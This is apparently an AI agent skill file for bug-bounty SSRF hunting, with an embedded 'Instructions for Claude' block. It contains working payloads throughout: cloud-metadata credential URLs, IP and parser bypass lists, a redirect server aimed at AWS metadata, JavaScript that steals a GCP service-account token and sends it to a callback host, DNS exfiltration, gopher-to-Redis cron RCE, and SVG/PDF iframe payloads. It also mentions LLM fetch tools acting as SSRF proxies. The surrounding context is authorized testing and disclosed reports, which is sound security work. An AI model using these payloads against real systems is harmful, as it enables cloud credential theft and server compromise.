---
name: hunt-ssrf
description: Comprehensive SSRF testing: cloud metadata chains, IP bypass techniques, protocol smuggling, filter evasion. Real-world bounty examples and impact escalation paths.
---

## Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

## OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Default workflow

1. **Plant the Collaborator subdomain first** (sub-tag it per sink: `dlsrcurl.<collab>`, `import.<collab>`, etc., so callbacks tell you which sink fired).
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.

**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/*/preview
/api/*/fetch
/api/*/import
/api/*/webhook
/api/*/proxy
/api/*/render
/api/*/link
/api/*/screenshot
/api/*/export
/api/*/validate
?url=
?uri=
?endpoint=
?redirect=
?src=
?source=
?feed=
?host=
?target=
?dest=
?file=
?path=
?callback=
?image=
?load=
?fetch=
```

### JS Patterns (in client-side code)
```javascript
// Look for these in JS bundles
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Response Header Signals
```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals
- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

## Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   - Exfil via DNS: encode response data in subdomain of your callback domain

8. **Enumerate the internal network** using timing differences and error message variations:
   - Port scan via response time (`connection refused` vs timeout)
   - Check error messages for hostname/IP leakage

9. **Chain findings** — if you have SSRF to internal services, look for:
   - Unauthenticated admin endpoints
   - Redis, memcached (protocol smuggling)
   - Internal OAuth token endpoints
   - SSRF → CSRF → RCE (GitHub Enterprise pattern)

10. **Document the full chain** with screenshots of each hop before reporting.

---

## Payload & Detection Patterns

### Basic Out-of-Band Detection
```bash
# Using interactsh-client
interactsh-client -v

# Test parameter
curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"

# With common headers that might unlock SSRF
curl -s "https://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR_ID.oast.pro"}'
```

### Cloud Metadata Payloads
```bash
# GCP - requires Metadata-Flavor header (test if server adds it automatically)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id

# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Localhost/Internal Port Payloads
```bash
# Kubernetes internals
http://127.0.0.1:6443/api/v1/namespaces
http://10.0.0.1:6443/api/v1/secrets
http://127.0.0.1:10250/pods          # kubelet
http://127.0.0.1:2379/v2/keys        # etcd

# Common internal services
http://127.0.0.1:6379/               # Redis (check for inline commands)
http://127.0.0.1:9200/_cat/indices   # Elasticsearch
http://127.0.0.1:5601/               # Kibana
http://127.0.0.1:8500/v1/catalog/services  # Consul
```

### Redirect-Based SSRF (when direct is blocked)
```python
# Simple Python redirect server
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
```

### JavaScript-Based SSRF (headless browser contexts)
```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### Grep Patterns for Source Code Review
```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

### ffuf Parameter Discovery
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

---

## Common Root Causes

1. **"The user said it was safe"** — Developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.

2. **Allowlist bypass via redirects** — Developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically. An attacker's server on the allowlist redirects to an internal address.

3. **Aggregated/proxy API trust** — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers. Compromising a single extension server gives SSRF into the core API.

4. **Server-side rendering without sandboxing** — Headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.

5. **XML/DSPL/file parsers fetching external entities** — Import features that parse structured files (XML, DSPL, CSV with remote schemas) fetch attacker-controlled URLs, often with no URL validation at all.

6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.

7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.

---

## Bypass Techniques

### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)

```
# IPv6 equivalents
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:169.254.169.254]/

# Decimal/octal/hex encoding of IP
http://2130706433/          (127.0.0.1 decimal)
http://0x7f000001/          (127.0.0.1 hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://0/                   (resolves to 0.0.0.0)

# DNS rebinding - register a domain that resolves to internal IP after first check
# Use https://lock.cmpxchg8b.com/rebinder.html

# Subdomain pointing to internal IP
http://localtest.me/         (resolves to 127.0.0.1)
http://127.0.0.1.nip.io/
http://customer.attacker.com/ (A record → 192.168.1.1)

# URL parser confusion
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://127.0.0.1%25@evil.com  (URL encoding)
http://evil.com\.127.0.0.1/   (backslash)

# Protocol confusion
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
sftp://attacker.com:11111/
ldap://127.0.0.1/

# Redirect chain bypass
https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/

# Case variation / URL encoding
http://Localhost/
http://127.0.0.1%2F@evil.com/
```

### Schema/Protocol Bypasses
```
# When only http/https allowed but implementation is loose
http://169.254.169.254:80@evil.com/
//169.254.169.254/
```

### TOCTOU (Time-of-Check vs Time-of-Use)
- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls

### When Response is Not Returned (Blind SSRF)
- Use DNS-only callbacks (data encoded in subdomain labels)
- Use timing differences for port scanning
- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
- Chain with other bugs that leak response data (e.g., error messages, logs)

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

## Real Impact Examples

### Scenario A: Cloud Credential Exfiltration via Link Preview (Snapchat/GCP Pattern)
A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate thumbnail content. The feature ran on GCP Compute Engine with IMDSv1 enabled and no `Metadata-Flavor` header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

### Scenario B: Kubernetes API Compromise via Hijacked Aggregated Server (Kubernetes Pattern)
An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. This effectively allowed an attacker with limited API registration privileges to escalate to full cluster secret read access — a critical privilege escalation via SSRF chained through trusted infrastructure components.

---

## Disclosed Report Citations (Backfill +6 — 2018-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Cloud-metadata SSRFs across all three providers, DNS rebinding, gopher-to-Redis-RCE, link-preview SSRF, and headless-browser/PDF-generator chains are all represented.

3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
    - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
    - Payload: injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
    - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
    - Year: 2023 — **$25,000** (CVSS 10.0 Critical)

4. **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** ([H1 #341876](https://hackerone.com/reports/341876))
    - Subclass: GCP metadata SSRF → SSRF-to-RCE chain
    - Payload: created store on partners.shopify.com, edited `password.liquid` template to embed a request to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`, then triggered the Exchange screenshotting service to render the template server-side
    - Root cause: screenshotter fetched user-controlled template with no metadata-host blocklist and no metadata-concealment proxy
    - Year: 2018 — **$25,000** (canonical headless-browser → metadata)

5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
    - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `1.2.3.4` (public) and `169.254.169.254`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
    - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
    - Year: 2021 — fixed in 8.5.7 / 9.0.1

6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
    - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
    - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
    - Year: 2020 — **$15,000**

7. **Reddit Matrix — Blind SSRF in `preview_url` API** ([H1 #1960765](https://hackerone.com/reports/1960765))
    - Subclass: link-preview SSRF (blind, internal port-scan via timing/response codes)
    - Payload: `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/` — varied internal IPs/ports; service names and IPs leaked through response differences before the fix
    - Root cause: link-preview fetcher did not reject RFC1918 / link-local destinations; allowlist-by-scheme only
    - Year: 2023 — **$6,000**

8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
    - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `169.254.169.254`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
    - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
    - Year: 2023-2024 — **$15,000 total** across 3 reports

---

## Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

---

# Additional Techniques (merged from offensive-ssrf/SKILL.md)

## Description
Server-Side Request Forgery testing checklist: SSRF discovery, blind SSRF with out-of-band, cloud metadata endpoints (AWS/GCP/Azure), SSRF filter bypass techniques (IP encoding, DNS rebinding, redirect chains), and SSRF to RCE escalation. Use for web app SSRF testing and bug bounty.

## Trigger Phrases
Use this skill when the conversation involves any of:
`SSRF, server-side request forgery, blind SSRF, cloud metadata, AWS metadata, GCP metadata, SSRF bypass, DNS rebinding, redirect chain, SSRF RCE, internal port scan`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Shortcut

- Spot the features prone to SSRF and take notes for future reference.
- Set up a callback listener to detect blind SSRF by using an online service, Netcat, or Burp's Collaborator feature.
- Provide the potentially vulnerable endpoints with common internal addresses or the address of your callback listener.
- Check if the server responds with information that confirms the SSRF. Or, in the case of a blind SSRF, check your server logs for requests from the target server.
- In the case of a blind SSRF, check if the server behavior differs when you request different hosts or ports.
- If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter.
- Pick a tactic to escalate the SSRF.

```mermaid
flowchart LR
    A[Identify SSRF Vectors] --> B[Setup Callback Listener]
    B --> C[Test Internal Addresses]
    C --> D{Response Contains\nInternal Data?}
    D -->|Yes| E[Basic SSRF Confirmed]
    D -->|No| F[Check Callback\nListener Logs]
    F --> G{Callbacks\nReceived?}
    G -->|Yes| H[Blind SSRF Confirmed]
    G -->|No| I[Try Bypass Techniques]
    I --> J[Retest with Bypasses]
    E --> K[Escalate SSRF]
    H --> K
    J --> D
```

## Mechanisms

Server-Side Request Forgery (SSRF) is a vulnerability that allows attackers to induce a server-side application to make requests to an unintended location. In a successful SSRF attack, the attacker can force the server to connect to:

- Internal services within the organization's infrastructure
- External systems on the internet
- Services on the same server (localhost)
- Cloud service provider metadata endpoints

```mermaid
graph TD
    A[Attacker] -->|Sends crafted request| B[Vulnerable Web App]
    B -->|Makes request to| C[Unintended Target]
    C -->|Responds with data| B
    B -->|Includes response data| A

    subgraph "Possible Targets"
        C
        D[Internal Network Services]
        E[Cloud Metadata Service]
        F[External Web Services]
        G[Local Services on Same Server]
    end

    C --- D
    C --- E
    C --- F
    C --- G
```

Types of SSRF include:

- **Basic SSRF**: Direct requests to internal/external resources
- **Blind SSRF**: No response returned, but requests still occur
- **Semi-blind SSRF**: Limited information returned in responses
- **Time-based SSRF**: Detection through response timing differences
- **Out-of-band SSRF**: Secondary channel used for data exfiltration

### Identifying SSRF Vectors

- **URL Input Fields**:
  - Website preview generators
  - Document/image imports from URLs
  - API integrations with external services
  - Webhook configurations
  - Export to PDF/screenshot functionality

- **Proxy Functionality**:
  - Web proxies
  - Content fetchers
  - API gateways
  - Translation services

- **File Processing**:
  - Media conversion tools
  - Document processors
  - XML/JSON processors with external entity support

- **Integration Points**:
  - Third-party service connections
  - Cloud storage integrations
  - Monitoring systems
  - Webhook endpoints

```mermaid
mindmap
  root((SSRF Vectors))
    URL Input Fields
      Website Previews
      URL Imports
      API Integrations
      Webhooks
      PDF/Screenshot Export
    Proxy Functionality
      Web Proxies
      Content Fetchers
      API Gateways
      Translation Services
    File Processing
      Media Converters
      Document Processors
      XML/JSON Processors
    Integration Points
      Third-party Services
      Cloud Storage
      Monitoring Systems
      Webhook Endpoints
```

### Test Methodology

1. **Identify Parameters**: Find URL or hostname parameters
2. **Setup Listener**: Configure a system to detect callbacks
   - Public server with unique URL
   - Burp Collaborator
   - Tools like Interactsh or canarytokens.org
3. **Test Internal Access**: Try accessing internal resources
   ```
   http://localhost:port
   http://127.0.0.1:port
   http://0.0.0.0:port
   http://internal-service.local
   http://169.254.169.254/ (cloud metadata)
   ```
4. **Observe Responses**: Check for:
   - Response time differences
   - Error messages
   - Content leakage
   - Callbacks to your server

```mermaid
sequenceDiagram
    participant Attacker
    participant WebApp as Vulnerable Web App
    participant Internal as Internal Services
    participant CallbackServer as Attacker's Callback Server

    Note over Attacker,CallbackServer: Phase 1: Basic SSRF Testing

    Attacker->>WebApp: Request with Internal URL<br>(http://localhost:8080)
    WebApp->>Internal: Makes request to internal service
    Internal->>WebApp: Response from internal service
    WebApp->>Attacker: Leaked internal response

    Note over Attacker,CallbackServer: Phase 2: Blind SSRF Testing

    Attacker->>WebApp: Request with Callback URL<br>(http://attacker-server.com/unique-id)
    WebApp->>CallbackServer: Makes request to callback server
    CallbackServer->>Attacker: Log notification of request

    Note over Attacker,CallbackServer: Phase 3: Bypass Testing

    Attacker->>WebApp: Request with Obfuscated URL<br>(http://127.0.0.1.attacker.com)
    WebApp->>CallbackServer: Makes request due to parser confusion
    CallbackServer->>Attacker: Log notification of successful bypass
```

### Bypass Techniques Hunting

- Look for partial validation or URL parsing issues
- Test scheme changes (http→https, http→file)
- Try different IP formats (decimal, octal, hex)
- Use URL shorteners if allowed
- Check DNS rebinding possibilities

### Allowlist Bypasses

- **Open Redirects**: Using allowed domains with redirect parameters
  ```
  https://allowed-domain.com/redirect?url=http://internal-server
  ```
- **DNS Spoofing**: Register expired domains from allowlist
- **Subdomain Takeover**: Control subdomains of allowed domains
- **Path Traversal**: `https://allowed-domain.com@evil.com`

### Denylist Bypasses

- **Alternate IP Representations**:
  ```
  http://127.0.0.1/
  http://127.1/
  http://0177.0.0.1/
  http://0x7f.0.0.1/
  http://2130706433/ (decimal representation)
  ```
- **IPv6 Variations**:
  ```
  http://[::1]/
  http://[::127.0.0.1]/
  http://[0:0:0:0:0:ffff:127.0.0.1]/
  ```
- **Domain Resolutions**:
  ```
  http://localhost.evil.com/ (when attacker controls evil.com DNS)
  http://spoofed-domain/ (with modified /etc/hosts)
  ```
- **URL Encoding Tricks**:
  ```
  http://127.0.0.1/ → http://127%2e0%2e0%2e1/
  http://localhost/ → http://%6c%6f%63%61%6c%68%6f%73%74/
  ```
- **Non-Standard Ports**: Accessing standard services on non-standard ports
- **Case Manipulation**: `http://LoCaLhOsT/`
- **URL Schema Confusion**: `http:////localhost/`

```mermaid
flowchart TD
    A[SSRF Protection Bypass] --> B[Allowlist Bypass]
    A --> C[Denylist Bypass]

    B --> B1[Open Redirects]
    B --> B2[DNS Spoofing]
    B --> B3[Subdomain Takeover]
    B --> B4[Path Traversal]

    C --> C1[IP Representation Tricks]
    C1 --> C1a[Decimal: 2130706433]
    C1 --> C1b[Octal: 0177.0.0.1]
    C1 --> C1c[Hex: 0x7f.0.0.1]
    C1 --> C1d[Shortened: 127.1]

    C --> C2[IPv6 Variations]
    C2 --> C2a["[::1]"]
    C2 --> C2b["[::127.0.0.1]"]

    C --> C3[Domain Tricks]
    C3 --> C3a[localhost.evil.com]
    C3 --> C3b[spoofed-domain]

    C --> C4[Encoding Tricks]
    C4 --> C4a[URL Encoding]
    C4 --> C4b[Double Encoding]

    C --> C5[Schema Confusion]
    C5 --> C5a["http:////localhost"]

    style A fill:#f96,stroke:#333,stroke-width:2px,color:#333
    style B fill:#aae,stroke:#333,color:#333
    style C fill:#aae,stroke:#333,color:#333
```

### Uncommon Techniques

- **DNS Rebinding**: Change DNS resolution mid-connection
- **Temporal Intents**: Reliance on stale DNS resolution
- **Double URL Encoding**: Encode already encoded values
- **Unicode Normalization**: Using similar-looking characters
- **Protocol Downgrading**: Switching from https to http

### Additional Cloud Endpoints

- **Alibaba Cloud**: `http://100.100.100.200/latest/meta-data/`
- **Packet Cloud**: `https://metadata.packet.net/userdata`
- **ECS Task**: `http://169.254.170.2/v2/credentials/`
- **OpenStack**: `http://169.254.169.254/openstack/latest/meta_data.json`

### Other Bypass Methods

- **Weak Parser Exploits**:
  ```
  http://127.1.1.1:80\@127.2.2.2:80/
  http://127.1.1.1:80\@@127.2.2.2:80/
  http://127.1.1.1:80:\@@127.2.2.2:80/
  ```
- **Filter Bypass**:
  ```
  0://evil.com:80;http://google.com:80/
  ```
- **Enclosed Alphanumerics**: Using special Unicode characters that look like regular characters
  ```
  http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
  ```
- Host header abuse (`Host:` or `X-Forwarded-Host:`) against permissive back-end proxies
- Unicode homoglyph hostnames (e.g., ⅰⅱⅲ.local) to dodge simple regex checks
- DNS-over-HTTPS lookups (`https://dns.google/resolve?name=…`) to leak internal hostnames

### PDF SSRF Exploitation

When SSRF occurs in PDF rendering functionality, SVG can be used to exploit it:

```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### Additional IP Representation Bypasses

```
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://0330.072.0326.0343
http://033016553343
http://0x0NaN0NaN
http://0xNaN.0xaN0NaN
http://0xNaN.0xNa0x0NaN
http://shmilon.0xNaN.undefined.undefined
http://NaN
http://0NaN
http://0NaN.0NaN
```

### Common SSRF Vulnerabilities

#### Cloud Metadata Access

- **AWS**: `http://169.254.169.254/latest/meta-data/` (IMDSv2 is now default; first acquire a session token with `PUT /latest/api/token` and include it in `X-aws-ec2-metadata-token`)

**AWS IMDSv2 Session Token Bypass Techniques:**

Many SSRF filters block `169.254.169.254` but miss the two-step IMDSv2 flow:

```python

# Step 1: Obtain session token (requires PUT request)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Example 1: Via parameter that accepts methods
POST /api/fetch
{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
}

# Example 2: Via URL scheme that triggers PUT
http://vulnerable.com/proxy?url=http://169.254.169.254/latest/api/token&method=PUT

# Step 2: Use token to access metadata
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
X-aws-ec2-metadata-token: <TOKEN_FROM_STEP1>
```

**IMDSv2 Bypass Scenarios:**

1. Application supports custom HTTP methods in SSRF
2. Server-side HTTP client uses method from request parameter
3. HTTP parameter pollution (mixing GET with PUT semantics)
4. SSRF through applications that intentionally support PUT (webhooks, API gateways)
5. Vulnerable proxy servers that forward method override headers (`X-HTTP-Method-Override: PUT`)

- **Azure**: `http://169.254.169.254/metadata/instance` (requires header `Metadata: true` and `api-version`; alternate IP `http://168.63.129.16/metadata/instance`)
- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
- **Equinix Metal**: `http://169.254.169.254/metadata` (legacy `metadata.packet.net` now redirects here)
- **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/`
- **Oracle Cloud**: `http://169.254.169.254/opc/v1/instance/`

#### Internal Service Exposure

- **Admin Interfaces**: `http://localhost:8080/admin`
- **Databases**: `http://localhost:3306`, `http://localhost:27017`
- **Caching Servers**: `http://localhost:6379` (Redis)
- **Management APIs**: `http://localhost:8500` (Consul)
- **Development Servers**: `http://localhost:3000`, `http://localhost:8000`

#### Protocol Abuse

- **File Protocol**: `file:///etc/passwd`
- **Dict Protocol**: `dict://localhost:6379/info`
- **Gopher Protocol**: `gopher://localhost:25/`
- **TFTP Protocol**: `tftp://localhost:69/`
- **LDAP Protocol**: `ldap://localhost:389/`
- **HTTP/2 Coalescing**: Re-used TLS connections between SAN-matched hostnames can bypass host-based filters
- **h2c Upgrade**: Clear-text HTTP/2 upgrade (`PRI * HTTP/2.0`) may slip past scheme filters
- **IPv6‑mapped IPv4**: `http://[::ffff:127.0.0.1]` and `http://[::ffff:7f00:1]`
- **Zone‑scoped IPv6**: `http://[fe80::1%25lo0]:80` may confuse naive validators

```mermaid
